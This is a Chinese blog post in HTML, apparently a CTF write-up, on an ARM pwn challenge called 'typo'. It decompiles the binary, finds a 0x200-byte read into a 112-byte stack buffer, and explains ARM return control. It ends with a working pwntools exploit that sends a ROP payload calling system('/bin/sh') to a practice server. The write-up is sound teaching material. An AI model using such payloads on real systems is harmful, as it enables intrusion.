@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="arm pwn入门题，有system和&#x2F;bin&#x2F;sh，简单的栈溢出。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="typo">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/03/23/typo/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="arm pwn入门题，有system和&#x2F;bin&#x2F;sh，简单的栈溢出。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-23T07:56:03.000Z">
+<meta property="article:modified_time" content="2023-03-23T09:19:26.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="arm">
+<meta property="article:tag" content="stackoverflow">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/03/23/typo/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>typo | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/03/23/typo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          typo
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-23 15:56:03 / 修改时间：17:19:26" itemprop="dateCreated datePublished" datetime="2023-03-23T15:56:03+08:00">2023-03-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>arm pwn入门题，有<code>system</code>和<code>/bin/sh</code>，简单的栈溢出。</p>
+<span id="more"></span>
+
+<p>先checksec和file查下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位ARM，静态链接</span></span><br><span class="line">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只开了NX</span></span><br><span class="line">[*] <span class="string">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/typo&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure>
+
+<p>逆向：</p>
+<p>有太多的sub了，很多函数需要靠猜。</p>
+<p>程序大概的功能就是不断随机读取单词表中的一个单词，如果输入与他一样则继续，否则告诉你<code>E.r.r.o.r</code>，输入<code>~</code>则结束，会告诉你准确率以及速度。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> correct; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">double</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">double</span> v14; <span class="comment">// [sp+8h] [bp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+10h] [bp-24h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+14h] [bp-20h]</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [sp+18h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+1Ch] [bp-18h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [sp+20h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [sp+24h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  setbuf((<span class="type">unsigned</span> <span class="type">int</span> *)off_A1538, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  setbuf((<span class="type">unsigned</span> <span class="type">int</span> *)off_A1534[<span class="number">0</span>], <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  write(</span><br><span class="line">    (<span class="type">void</span> *)<span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;Let&#x27;s Do Some Typing Exercise~\nPress Enter to get start;\nInput ~ if you want to quit\n&quot;</span>,</span><br><span class="line">    (<span class="type">void</span> *)<span class="number">0x56</span>,</span><br><span class="line">    v3);</span><br><span class="line">  <span class="keyword">if</span> ( getchar() != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  write((<span class="type">void</span> *)<span class="number">1</span>, <span class="string">&quot;------Begin------&quot;</span>, (<span class="type">void</span> *)<span class="number">0x11</span>, (<span class="type">void</span> *)<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  v7 = gettimeofday(<span class="number">0</span>, v4, v5, v6);</span><br><span class="line">  sub_FE28(v7);</span><br><span class="line">  correct = ftime(v8);</span><br><span class="line">  v18 = correct;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v20;</span><br><span class="line">    idx = rand(correct, v10) % <span class="number">4504</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>, &amp;aAbandon[<span class="number">20</span> * idx]);      <span class="comment">// 从单词表中输出一个单词</span></span><br><span class="line">    correct = read_and_cmp((<span class="type">int</span>)&amp;aAbandon[<span class="number">20</span> * idx]);<span class="comment">// 接收输入并与单词比较 漏洞在这</span></span><br><span class="line">    v16 = correct;</span><br><span class="line">    <span class="keyword">if</span> ( !correct )                             <span class="comment">// 输入的与输出的不一致则输出error</span></span><br><span class="line">    &#123;</span><br><span class="line">      correct = <span class="built_in">puts</span>((<span class="type">int</span>)<span class="string">&quot;E.r.r.o.r.&quot;</span>);</span><br><span class="line">      ++v19;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v16 != <span class="number">2</span> );</span><br><span class="line">  v15 = ftime(correct);</span><br><span class="line">  LODWORD(v11) = sub_9428(v15 - v18);</span><br><span class="line">  v14 = v11 / <span class="number">1000000.0</span>;</span><br><span class="line">  write((<span class="type">void</span> *)<span class="number">1</span>, <span class="string">&quot;------END------&quot;</span>, (<span class="type">void</span> *)<span class="number">0xF</span>, (<span class="type">void</span> *)COERCE_UNSIGNED_INT64(v11 / <span class="number">1000000.0</span>));</span><br><span class="line">  sub_11F80(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  sub_8DF0(v20 - <span class="number">1</span>, v19, v14);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="type">int</span>)<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点关注接收输入并比较的函数<code>read_and_cmp</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_8D24</span><span class="params">(<span class="type">unsigned</span> __int8 *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">112</span>]; <span class="comment">// [sp+Ch] [bp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  read(<span class="number">0</span>, v6, (<span class="type">void</span> *)<span class="number">0x200</span>, v6);               <span class="comment">// 类似read，读取0x200byte到v6，存在栈溢出</span></span><br><span class="line">  len = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, (<span class="type">unsigned</span> __int8 *)v6, len) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="built_in">strlen</span>(v6) - <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] == <span class="string">&#x27;~&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;                                   <span class="comment">// 到这里才能跳出循环</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到这里漏洞已经挺明显的了，存在栈溢出漏洞，而且程序中存在<code>system</code>和<code>/bin/sh</code>，覆盖返回地址执行<code>system(&quot;/bin/sh&quot;)</code>就可以get shell了。</p>
+<p>但是<code>ARM</code>架构和<code>x86</code>架构有些不同，<code>ARM</code>栈结构不像<code>x86</code>那样有<code>bp</code>和<code>return_addr</code>垫在最下方，但也差不多。</p>
+<p><code>ARM</code>使用<code>LR</code>寄存器（<code>R14</code>或<code>X30</code>）保存函数的返回地址，而为了能在该函数执行完后，知道上一层函数的返回地址，需要将其保存在栈上，在函数返回时更新<code>LR</code>寄存器的值，因此可以通过栈溢出覆盖这个值来控制<code>LR</code>。</p>
+<p>在进行<code>ROP</code>的时候<code>ARM</code>也有所不同，由于<code>POP</code>和<code>PUSH</code>可以对<code>LR</code>和<code>PC</code>进行操作，没有<code>ret</code>，因此控制<code>PC</code>控制程序的执行流。通常找的<code>gadget</code>后面都有对<code>pc</code>的控制，通过控制<code>PC</code>控制执行流即可。</p>
+<p>exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">filename=<span class="string">&#x27;typo&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./&#x27;</span>+filename)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class="line"><span class="comment"># p=process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;8888&quot;, &quot;./typo&quot;])</span></span><br><span class="line"><span class="comment">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28805</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recvline(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> x                  :p.recvuntil(x)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;\n&#x27;</span></span>):</span><br><span class="line">  gdb.attach(p,cmd)</span><br><span class="line">  pause()</span><br><span class="line">    </span><br><span class="line">pop_ro_r4_pc=<span class="number">0x00020904</span></span><br><span class="line">sys_addr=<span class="number">0x000110B4</span></span><br><span class="line">binsh_addr=<span class="number">0x0006C384</span></span><br><span class="line">r()</span><br><span class="line">s(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(pop_ro_r4_pc)+p32(binsh_addr)*<span class="number">2</span>+p32(sys_addr)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/arm/" rel="tag"># arm</a>
+              <a href="/tags/stackoverflow/" rel="tag"># stackoverflow</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/21/MTCTF-smtp/" rel="prev" title="MTCTF-smtp">
+      <i class="fa fa-chevron-left"></i> MTCTF-smtp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/23/ret2win_asmv5/" rel="next" title="ret2win_armv5">
+      ret2win_armv5 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
